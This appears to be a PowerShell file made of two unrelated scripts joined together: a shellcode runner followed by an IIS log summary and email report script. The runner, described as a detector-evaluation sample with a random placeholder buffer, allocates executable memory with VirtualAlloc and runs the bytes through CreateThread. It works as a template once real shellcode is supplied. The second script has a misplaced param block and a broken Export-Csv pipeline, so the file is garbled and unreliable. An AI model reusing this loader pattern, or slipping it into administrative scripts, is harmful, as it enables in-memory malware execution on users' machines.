<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\stage.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xf7, 0x91, 0xf2, 0x2e, 0xe1, 0xd0, 0x44, 0x68, 0x5d, 0x21, 0x4b, 0x86, 0x4d, 0x1d, 0x3e, 0x65,
    0x0a, 0xb5, 0xa2, 0xca, 0x39, 0xa9, 0xf3, 0x0f, 0x39, 0x5f, 0x66, 0x48, 0x15, 0x93, 0x7d, 0xe2,
    0x0a, 0x3b, 0x67, 0x95, 0x8e, 0xfc, 0xbd, 0xcc, 0xf0, 0x89, 0x39, 0xfe, 0x1b, 0x5f, 0xb2, 0x11,
    0x4f, 0xd8, 0x7b, 0x25, 0xc7, 0x21, 0xdb, 0x0b, 0x07, 0x85, 0x0a, 0xfa, 0x7e, 0xbf, 0x5b, 0xbc,
    0xc1, 0x8b, 0x75, 0xe7, 0xff, 0xcf, 0x36, 0xf7, 0x0d, 0xa2, 0xa6, 0x2d, 0xab, 0x9c, 0xb8, 0xd8,
    0x45, 0x4e, 0x72, 0x2c, 0x25, 0x63, 0x0f, 0x19, 0xdd, 0xf6, 0xf3, 0x72, 0x2d, 0xac, 0xf5, 0x06,
    0xed, 0x8b, 0xd7, 0xba, 0xa6, 0x9f, 0x6a, 0x09, 0x4e, 0x28, 0xd1, 0x19, 0xb0, 0xe4, 0xc0, 0xa7,
    0x28, 0x98, 0x25, 0xe0, 0x03, 0xac, 0x65, 0xb1, 0xdc, 0xba, 0x4b, 0xc5, 0x95, 0x3a, 0x99, 0x8b,
    0x2f, 0xd2, 0xbc, 0x4e, 0x9a, 0xb8, 0xcd, 0x4f, 0x27, 0x88, 0x3c, 0x6d, 0x46, 0x15, 0x03, 0xc6,
    0xb7, 0x92, 0x96, 0xae, 0x70, 0x22, 0x78, 0x76, 0x6a, 0x4a, 0xac, 0x9c, 0xcc, 0xa6, 0x29, 0xac,
    0xd5, 0x35, 0x4c, 0xb4, 0x1b, 0x39, 0xbb, 0x72, 0x87, 0x4a, 0x06, 0xe2, 0x6c, 0x04, 0x8e, 0x10,
    0xd8, 0xca, 0x8f, 0x61, 0xc3, 0xc9, 0xa6, 0xc6, 0x89, 0x02, 0xea, 0x3d, 0x70, 0xe7, 0x7f
)

$Handle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 4879)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$LogRoot = 'C:\inetpub\logs\LogFiles\W3SVC7',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 7,
    [int]$TopN = 5,
    [string]$OutputPath = 'C:\Reports\iis-top-2025-07-15.csv',
    [string]$HtmlPath = "C:\Reports\iis-2025-07-15.html"
)

$ErrorActionPreference = "Stop"
$InformationPreference = 'SilentlyContinue'

$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}
$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$slowest = $entries | Sort-Object -Property TimeTaken -Descending |
    Select-Object -First $TopN Uri, TimeTaken, Status

$topUrls |
    -NoTypeInformation `
    -Path $OutputPath

$byStatus | Export-Csv -Path $OutputPath.Replace('.csv', '-status.csv') -NoTypeInformation -Encoding UTF8
$slowest | Export-Csv -Path $OutputPath.Replace('.csv', '-slow.csv') -NoTypeInformation

$byDay = $entries | Group-Object -Property Date | Sort-Object -Property Name |
    ForEach-Object {
        [pscustomobject]@{
            Date     = $_.Name
            Requests = $_.Count
            Errors   = @($_.Group | Where-Object { $_.Status -ge 400 }).Count
        }
    }
$byDay | Format-Table -AutoSize

$notFound = $entries | Where-Object { $_.Status -eq 404 } |
    Group-Object -Property Uri | Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$notFound | Export-Csv -Path $OutputPath.Replace('.csv', '-404.csv') -NoTypeInformation -Encoding UTF8

$byHour = $entries | Group-Object -Property { ($_.Time -split ':')[0] } |
    Sort-Object -Property Name
$byHour | ForEach-Object {
    Write-Verbose ("Hour {0}: {1} requests" -f $_.Name, $_.Count)
}
$style = @'
<style>
body { font-family: Tahoma; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byDay | ConvertTo-Html -Title 'IIS traffic by day' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8

$MailTo = 'webops@contoso.com'
$MailFrom = "iis-report@contoso.com"
$summaryBody = $byStatus | ConvertTo-Html -Fragment | Out-String

Send-MailMessage -To $MailTo -From $MailFrom -Subject "IIS log summary" -Body $summaryBody -SmtpServer "smtp.contoso.com" -Port 587 -UseSsl

foreach ($log in $logFiles) {
    $sizeMB = [math]::Round($log.Length / 1MB, 2)
    Write-Verbose ("{0}: {1} MB" -f $log.Name, $sizeMB)
}
Write-Host ("Top URL: {0} ({1} hits)" -f $topUrls[0].Uri, $topUrls[0].Count) -ForegroundColor Green
Write-Verbose ("Log files processed: {0}" -f @($logFiles).Count)

$bots = $entries | Where-Object { $_.Uri -match 'robots|sitemap' }
Write-Verbose ("Crawler requests: {0}" -f @($bots).Count)

$compressed = @(Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) }).Count
Write-Verbose ("Logs older than 30 days: {0}" -f $compressed)

$medianTime = ($entries | Measure-Object -Property TimeTaken -Average).Average
Write-Verbose ("Average time taken: {0:N1} ms" -f $medianTime)

$bigResponses = $entries | Sort-Object -Property Bytes -Descending | Select-Object -First 5
$bigResponses | Format-Table Uri, Bytes, Status -AutoSize

$byMethod = $entries | Group-Object -Property Method | Sort-Object -Property Count -Descending
$byMethod | Format-Table Name, Count -AutoSize

$errorRate = [math]::Round((@($errorEntries).Count / $totalRequests) * 100, 2)
Write-Host ("Error rate: {0} percent" -f $errorRate) -ForegroundColor Yellow

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
